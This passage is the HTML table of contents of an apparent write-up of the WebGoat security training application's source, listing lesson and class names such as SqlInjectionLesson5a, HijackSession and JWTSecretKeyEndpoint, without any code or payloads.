class="toc-text">UserValidator</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UserForm"><span class="toc-number">15.2.3.</span> <span class="toc-text">UserForm</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Scoreboard"><span class="toc-number">15.2.4.</span> <span class="toc-text">Scoreboard</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UserSession"><span class="toc-number">15.2.5.</span> <span class="toc-text">UserSession</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#lessons-5"><span class="toc-number">16.</span> <span class="toc-text">lessons</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#webgoat-introduction"><span class="toc-number">16.1.</span> <span class="toc-text">webgoat_introduction</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WebGoatIntroduction"><span class="toc-number">16.1.1.</span> <span class="toc-text">WebGoatIntroduction</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%92%E9%94%99"><span class="toc-number">16.1.2.</span> <span class="toc-text">排错</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%9E%90"><span class="toc-number">16.1.3.</span> <span class="toc-text">解析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#webwolf-introduction"><span class="toc-number">16.2.</span> <span class="toc-text">webwolf_introduction</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WebWolfIntroduction"><span class="toc-number">16.2.1.</span> <span class="toc-text">WebWolfIntroduction</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MailAssignment"><span class="toc-number">16.2.2.</span> <span class="toc-text">MailAssignment</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Email-1"><span class="toc-number">16.2.3.</span> <span class="toc-text">Email</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%92%E9%94%99-1"><span class="toc-number">16.2.4.</span> <span class="toc-text">排错</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9B%B4%E6%8D%A2%E4%B8%BAhsqldb%E5%B9%B6%E8%BF%9B%E8%A1%8C%E8%BF%9E%E6%8E%A5%E6%9F%A5%E7%9C%8B"><span class="toc-number">16.2.5.</span> <span class="toc-text">更换为hsqldb并进行连接查看</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LandingAssignment"><span class="toc-number">16.2.6.</span> <span class="toc-text">LandingAssignment</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#http-basics"><span class="toc-number">16.3.</span> <span class="toc-text">http_basics</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HttpBasics"><span class="toc-number">16.3.1.</span> <span class="toc-text">HttpBasics</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HttpBasicsLesson"><span class="toc-number">16.3.2.</span> <span class="toc-text">HttpBasicsLesson</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HttpBasicsQuiz"><span class="toc-number">16.3.3.</span> <span class="toc-text">HttpBasicsQuiz</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#http-proxies"><span class="toc-number">16.4.</span> <span class="toc-text">http_proxies</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HttpProxies"><span class="toc-number">16.4.1.</span> <span class="toc-text">HttpProxies</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HttpBasicsInterceptRequest"><span class="toc-number">16.4.2.</span> <span class="toc-text">HttpBasicsInterceptRequest</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#chrome-dev-tools"><span class="toc-number">16.5.</span> <span class="toc-text">chrome_dev_tools</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ChromeDevTools"><span class="toc-number">16.5.1.</span> <span class="toc-text">ChromeDevTools</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#chrome-dev-tools-1"><span class="toc-number">16.6.</span> <span class="toc-text">chrome_dev_tools</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#NetworkDummy"><span class="toc-number">16.6.1.</span> <span class="toc-text">NetworkDummy</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#xss"><span class="toc-number">16.6.1.1.</span> <span class="toc-text">xss</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#DOMCrossSiteScripting"><span class="toc-number">16.6.1.1.1.</span> <span class="toc-text">DOMCrossSiteScripting</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NetworkLesson"><span class="toc-number">16.6.2.</span> <span class="toc-text">NetworkLesson</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cia"><span class="toc-number">16.7.</span> <span class="toc-text">cia</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CIA"><span class="toc-number">16.7.1.</span> <span class="toc-text">CIA</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CIAQuiz"><span class="toc-number">16.7.2.</span> <span class="toc-text">CIAQuiz</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lesson-template"><span class="toc-number">16.8.</span> <span class="toc-text">lesson_template</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#LessonTemplate"><span class="toc-number">16.8.1.</span> <span class="toc-text">LessonTemplate</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SampleAttack"><span class="toc-number">16.8.2.</span> <span class="toc-text">SampleAttack</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hijacksession"><span class="toc-number">16.9.</span> <span class="toc-text">hijacksession</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HijackSession"><span class="toc-number">16.9.1.</span> <span class="toc-text">HijackSession</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HijackSessionAssignment"><span class="toc-number">16.9.2.</span> <span class="toc-text">HijackSessionAssignment</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cas"><span class="toc-number">16.9.3.</span> <span class="toc-text">cas</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#HijackSessionAuthenticationProvider"><span class="toc-number">16.9.3.1.</span> <span class="toc-text">HijackSessionAuthenticationProvider</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Authentication"><span class="toc-number">16.9.3.2.</span> <span class="toc-text">Authentication</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#AuthenticationProvider"><span class="toc-number">16.9.3.3.</span> <span class="toc-text">AuthenticationProvider</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#idor"><span class="toc-number">16.10.</span> <span class="toc-text">idor</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#IDOR"><span class="toc-number">16.10.1.</span> <span class="toc-text">IDOR</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IDORLogin"><span class="toc-number">16.10.2.</span> <span class="toc-text">IDORLogin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IDORDiffAttributes"><span class="toc-number">16.10.3.</span> <span class="toc-text">IDORDiffAttributes</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IDORViewOwnProfile"><span class="toc-number">16.10.4.</span> <span class="toc-text">IDORViewOwnProfile</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UserProfile"><span class="toc-number">16.10.5.</span> <span class="toc-text">UserProfile</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IDORViewOwnProfileAltUrl"><span class="toc-number">16.10.6.</span> <span class="toc-text">IDORViewOwnProfileAltUrl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IDORViewOtherProfile"><span class="toc-number">16.10.7.</span> <span class="toc-text">IDORViewOtherProfile</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IDOREditOtherProfiile"><span class="toc-number">16.10.8.</span> <span class="toc-text">IDOREditOtherProfiile</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#missing-ac"><span class="toc-number">16.11.</span> <span class="toc-text">missing_ac</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MissingFunctionACHiddenMenus"><span class="toc-number">16.11.1.</span> <span class="toc-text">MissingFunctionACHiddenMenus</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MissingFunctionACYourHash"><span class="toc-number">16.11.2.</span> <span class="toc-text">MissingFunctionACYourHash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MissingAccessControlUserRepository"><span class="toc-number">16.11.3.</span> <span class="toc-text">MissingAccessControlUserRepository</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#User"><span class="toc-number">16.11.4.</span> <span class="toc-text">User</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MissingFunctionACUsers"><span class="toc-number">16.11.5.</span> <span class="toc-text">MissingFunctionACUsers</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MissingFunctionACYourHashAdmin"><span class="toc-number">16.11.6.</span> <span class="toc-text">MissingFunctionACYourHashAdmin</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#spoofcookie"><span class="toc-number">16.12.</span> <span class="toc-text">spoofcookie</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SpoofCookie"><span class="toc-number">16.12.1.</span> <span class="toc-text">SpoofCookie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SpoofCookieAssignment"><span class="toc-number">16.12.2.</span> <span class="toc-text">SpoofCookieAssignment</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#encoders"><span class="toc-number">16.12.3.</span> <span class="toc-text">encoders</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EncDec"><span class="toc-number">16.12.3.1.</span> <span class="toc-text">EncDec</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cryptography"><span class="toc-number">16.13.</span> <span class="toc-text">cryptography</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#EncodingAssignment"><span class="toc-number">16.13.1.</span> <span class="toc-text">EncodingAssignment</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XOREncodingAssignment"><span class="toc-number">16.13.2.</span> <span class="toc-text">XOREncodingAssignment</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HashingAssignment"><span class="toc-number">16.13.3.</span> <span class="toc-text">HashingAssignment</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SigningAssignment"><span class="toc-number">16.13.4.</span> <span class="toc-text">SigningAssignment</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CryptoUtil"><span class="toc-number">16.13.5.</span> <span class="toc-text">CryptoUtil</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SecureDefaultsAssignment"><span class="toc-number">16.13.6.</span> <span class="toc-text">SecureDefaultsAssignment</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql-injection"><span class="toc-number">16.14.</span> <span class="toc-text">sql_injection</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#introduction"><span class="toc-number">16.14.1.</span> <span class="toc-text">introduction</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SqlInjection"><span class="toc-number">16.14.1.1.</span> <span class="toc-text">SqlInjection</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SqlInjectionLesson2"><span class="toc-number">16.14.1.2.</span> <span class="toc-text">SqlInjectionLesson2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SqlInjectionLesson8"><span class="toc-number">16.14.1.3.</span> <span class="toc-text">SqlInjectionLesson8</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SqlInjectionLesson3"><span class="toc-number">16.14.1.4.</span> <span class="toc-text">SqlInjectionLesson3</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SqlInjectionLesson4"><span class="toc-number">16.14.1.5.</span> <span class="toc-text">SqlInjectionLesson4</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SqlInjectionLesson5"><span class="toc-number">16.14.1.6.</span> <span class="toc-text">SqlInjectionLesson5</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SqlInjectionLesson5a"><span class="toc-number">16.14.1.7.</span> <span class="toc-text">SqlInjectionLesson5a</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SqlInjectionLesson5b"><span class="toc-number">16.14.1.8.</span> <span class="toc-text">SqlInjectionLesson5b</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SqlInjectionLesson8-1"><span class="toc-number">16.14.1.9.</span> <span class="toc-text">SqlInjectionLesson8</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SqlInjectionLesson9"><span class="toc-number">16.14.1.10.</span> <span class="toc-text">SqlInjectionLesson9</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SqlInjectionLesson10"><span class="toc-number">16.14.1.11.</span> <span class="toc-text">SqlInjectionLesson10</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#advanced"><span class="toc-number">16.14.2.</span> <span class="toc-text">advanced</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SqlInjectionAdvanced"><span class="toc-number">16.14.2.1.</span> <span class="toc-text">SqlInjectionAdvanced</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SqlInjectionLesson6a"><span class="toc-number">16.14.2.2.</span> <span class="toc-text">SqlInjectionLesson6a</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SqlInjectionLesson6b"><span class="toc-number">16.14.2.3.</span> <span class="toc-text">SqlInjectionLesson6b</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SqlInjectionChallenge"><span class="toc-number">16.14.2.4.</span> <span class="toc-text">SqlInjectionChallenge</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SqlInjectionChallengeLogin"><span class="toc-number">16.14.2.5.</span> <span class="toc-text">SqlInjectionChallengeLogin</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SqlInjectionQuiz"><span class="toc-number">16.14.2.6.</span> <span class="toc-text">SqlInjectionQuiz</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mitigation"><span class="toc-number">16.14.3.</span> <span class="toc-text">mitigation</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SqlInjectionMitigations"><span class="toc-number">16.14.3.1.</span> <span class="toc-text">SqlInjectionMitigations</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SqlInjectionLesson10a"><span class="toc-number">16.14.3.2.</span> <span class="toc-text">SqlInjectionLesson10a</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SqlInjectionLesson10b"><span class="toc-number">16.14.3.3.</span> <span class="toc-text">SqlInjectionLesson10b</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SqlOnlyInputValidation"><span class="toc-number">16.14.3.4.</span> <span class="toc-text">SqlOnlyInputValidation</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SqlOnlyInputValidationOnKeywords"><span class="toc-number">16.14.3.5.</span> <span class="toc-text">SqlOnlyInputValidationOnKeywords</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SqlInjectionLesson13"><span class="toc-number">16.14.3.6.</span> <span class="toc-text">SqlInjectionLesson13</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Servers"><span class="toc-number">16.14.3.7.</span> <span class="toc-text">Servers</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#path-traversal"><span class="toc-number">16.15.</span> <span class="toc-text">path_traversal</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PathTraversal"><span class="toc-number">16.15.1.</span> <span class="toc-text">PathTraversal</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ProfileUpload"><span class="toc-number">16.15.2.</span> <span class="toc-text">ProfileUpload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ProfileUploadBase"><span class="toc-number">16.15.3.</span> <span class="toc-text">ProfileUploadBase</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ProfileUploadFix"><span class="toc-number">16.15.4.</span> <span class="toc-text">ProfileUploadFix</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ProfileUploadRemoveUserInput"><span class="toc-number">16.15.5.</span> <span class="toc-text">ProfileUploadRemoveUserInput</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ProfileUploadRetrieval"><span class="toc-number">16.15.6.</span> <span class="toc-text">ProfileUploadRetrieval</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ProfileZipSlip"><span class="toc-number">16.15.7.</span> <span class="toc-text">ProfileZipSlip</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xss-1"><span class="toc-number">16.16.</span> <span class="toc-text">xss</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CrossSiteScripting"><span class="toc-number">16.16.1.</span> <span class="toc-text">CrossSiteScripting</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CrossSiteScriptingLesson1"><span class="toc-number">16.16.2.</span> <span class="toc-text">CrossSiteScriptingLesson1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CrossSiteScriptingLesson5a"><span class="toc-number">16.16.3.</span> <span class="toc-text">CrossSiteScriptingLesson5a</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CrossSiteScriptingLesson6a"><span class="toc-number">16.16.4.</span> <span class="toc-text">CrossSiteScriptingLesson6a</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DOMCrossSiteScriptingVerifier"><span class="toc-number">16.16.5.</span> <span class="toc-text">DOMCrossSiteScriptingVerifier</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DOMCrossSiteScripting-1"><span class="toc-number">16.16.6.</span> <span class="toc-text">DOMCrossSiteScripting</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CrossSiteScriptingQuiz"><span class="toc-number">16.16.7.</span> <span class="toc-text">CrossSiteScriptingQuiz</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#stored"><span class="toc-number">16.16.8.</span> <span class="toc-text">stored</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#CrossSiteScriptingStored"><span class="toc-number">16.16.8.1.</span> <span class="toc-text">CrossSiteScriptingStored</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#StoredXssComments"><span class="toc-number">16.16.8.2.</span> <span class="toc-text">StoredXssComments</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Comment"><span class="toc-number">16.16.8.2.1.</span> <span class="toc-text">Comment</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#StoredCrossSiteScriptingVerifier"><span class="toc-number">16.16.8.2.2.</span> <span class="toc-text">StoredCrossSiteScriptingVerifier</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CrossSiteScriptingMitigation"><span class="toc-number">16.16.8.3.</span> <span class="toc-text">CrossSiteScriptingMitigation</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CrossSiteScriptingLesson3"><span class="toc-number">16.16.8.4.</span> <span class="toc-text">CrossSiteScriptingLesson3</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CrossSiteScriptingLesson4"><span class="toc-number">16.16.8.5.</span> <span class="toc-text">CrossSiteScriptingLesson4</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xxe"><span class="toc-number">16.17.</span> <span class="toc-text">xxe</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XXE"><span class="toc-number">16.17.1.</span> <span class="toc-text">XXE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SimpleXXE"><span class="toc-number">16.17.2.</span> <span class="toc-text">SimpleXXE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CommentsCache"><span class="toc-number">16.17.3.</span> <span class="toc-text">CommentsCache</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Comment-1"><span class="toc-number">16.17.4.</span> <span class="toc-text">Comment</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CommentsEndpoint"><span class="toc-number">16.17.5.</span> <span class="toc-text">CommentsEndpoint</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ContentTypeAssignment"><span class="toc-number">16.17.6.</span> <span class="toc-text">ContentTypeAssignment</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#BlindSendFileAssignment"><span class="toc-number">16.17.6.1.</span> <span class="toc-text">BlindSendFileAssignment</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#vulnerable-components"><span class="toc-number">16.18.</span> <span class="toc-text">vulnerable_components</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#VulnerableComponents"><span class="toc-number">16.18.1.</span> <span class="toc-text">VulnerableComponents</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#VulnerableComponentsLesson"><span class="toc-number">16.18.2.</span> <span class="toc-text">VulnerableComponentsLesson</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ContactImpl"><span class="toc-number">16.18.3.</span> <span class="toc-text">ContactImpl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Contact"><span class="toc-number">16.18.4.</span> <span class="toc-text">Contact</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#VulnerableComponentsLesson-1"><span class="toc-number">16.18.5.</span> <span class="toc-text">VulnerableComponentsLesson</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#auth-bypass"><span class="toc-number">16.19.</span> <span class="toc-text">auth_bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#AuthBypass"><span class="toc-number">16.19.1.</span> <span class="toc-text">AuthBypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#VerifyAccount"><span class="toc-number">16.19.2.</span> <span class="toc-text">VerifyAccount</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AccountVerificationHelper"><span class="toc-number">16.19.3.</span> <span class="toc-text">AccountVerificationHelper</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#insecure-login"><span class="toc-number">16.20.</span> <span class="toc-text">insecure_login</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#InsecureLogin"><span class="toc-number">16.20.1.</span> <span class="toc-text">InsecureLogin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#InsecureLoginTask"><span class="toc-number">16.20.2.</span> <span class="toc-text">InsecureLoginTask</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jwt-1"><span class="toc-number">16.21.</span> <span class="toc-text">jwt</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JWT"><span class="toc-number">16.21.1.</span> <span class="toc-text">JWT</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JWTDecodeEndpoint"><span class="toc-number">16.21.2.</span> <span class="toc-text">JWTDecodeEndpoint</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JWTVotesEndpoint"><span class="toc-number">16.21.3.</span> <span class="toc-text">JWTVotesEndpoint</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#votes"><span class="toc-number">16.21.4.</span> <span class="toc-text">votes</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Vote"><span class="toc-number">16.21.4.1.</span> <span class="toc-text">Vote</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Views"><span class="toc-number">16.21.4.2.</span> <span class="toc-text">Views</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JWTVotesEndpoint-1"><span class="toc-number">16.21.5.</span> <span class="toc-text">JWTVotesEndpoint</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JWTQuiz"><span class="toc-number">16.21.6.</span> <span class="toc-text">JWTQuiz</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JWTSecretKeyEndpoint"><span class="toc-number">16.21.7.</span> <span class="toc-text">JWTSecretKeyEndpoint</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JWTRefreshEndpoint"><span class="toc-number">16.21.8.</span> <span class="toc-text">JWTRefreshEndpoint</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JWTFinalEndpoint"><span class="toc-number">16.21.9.</span> <span class="toc-text">JWTFinalEndpoint</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#password-reset"><span class="toc-number">16.22.</span> <span class="toc-text">password_reset</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PasswordReset"><span class="toc-number">16.22.1.</span> <span class="toc-text">PasswordReset</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SimpleMailAssignment"><span class="toc-number">16.22.2.</span> <span class="toc-text">SimpleMailAssignment</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PasswordResetEmail"><span class="toc-number">16.22.3.</span> <span class="toc-text">PasswordResetEmail</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#QuestionsAssignment"><span class="toc-number">16.22.4.</span> <span class="toc-text">QuestionsAssignment</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SecurityQuestionAssignment"><span class="toc-number">16.22.5.</span> <span class="toc-text">SecurityQuestionAssignment</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TriedQuestions"><span class="toc-number">16.22.6.</span> <span class="toc-text">TriedQuestions</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ResetLinkAssignment"><span class="toc-number">16.22.7.</span> <span class="toc-text">ResetLinkAssignment</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ResetLinkAssignmentForgotPassword"><span class="toc-number">16.22.8.</span> <span class="toc-text">ResetLinkAssignmentForgotPassword</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#resetlink"><span class="toc-number">16.22.9.</span> <span class="toc-text">resetlink</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#PasswordChangeForm"><span class="toc-number">16.22.9.1.</span> <span class="toc-text">PasswordChangeForm</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#secure-passwords"><span class="toc-number">16.23.</span> <span class="toc-text">secure_passwords</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SecurePasswords"><span class="toc-number">16.23.1.</span> <span class="toc-text">SecurePasswords</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SecurePasswordsAssignment"><span class="toc-number">16.23.2.</span> <span class="toc-text">SecurePasswordsAssignment</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#deserialization"><span class="toc-number">16.24.</span> <span class="toc-text">deserialization</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#InsecureDeserialization"><span class="toc-number">16.24.1.</span> <span class="toc-text">InsecureDeserialization</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#InsecureDeserializationTask"><span class="toc-number">16.24.2.</span> <span class="toc-text">InsecureDeserializationTask</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#VulnerableTaskHolder"><span class="toc-number">16.24.2.1.</span> <span class="toc-text">VulnerableTaskHolder</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#logging"><span class="toc-number">16.25.</span> <span class="toc-text">logging</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#LogSpoofing"><span class="toc-number">16.25.1.</span> <span class="toc-text">LogSpoofing</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LogSpoofingTask"><span class="toc-number">16.25.2.</span> <span class="toc-text">LogSpoofingTask</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LogBleedingTask"><span class="toc-number">16.25.3.</span> <span class="toc-text">LogBleedingTask</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#csrf"><span class="toc-number">16.26.</span> <span class="toc-text">csrf</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF"><span class="toc-number">16.26.1.</span> <span class="toc-text">CSRF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRFConfirmFlag1"><span class="toc-number">16.26.2.</span> <span class="toc-text">CSRFConfirmFlag1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRFGetFlag"><span class="toc-number">16.26.3.</span> <span class="toc-text">CSRFGetFlag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ForgedReviews"><span class="toc-number">16.26.4.</span> <span class="toc-text">ForgedReviews</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Review"><span class="toc-number">16.26.5.</span> <span class="toc-text">Review</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRFFeedback"><span class="toc-number">16.26.6.</span> <span class="toc-text">CSRFFeedback</span></a></li><li class="toc-item toc-level-3"><a 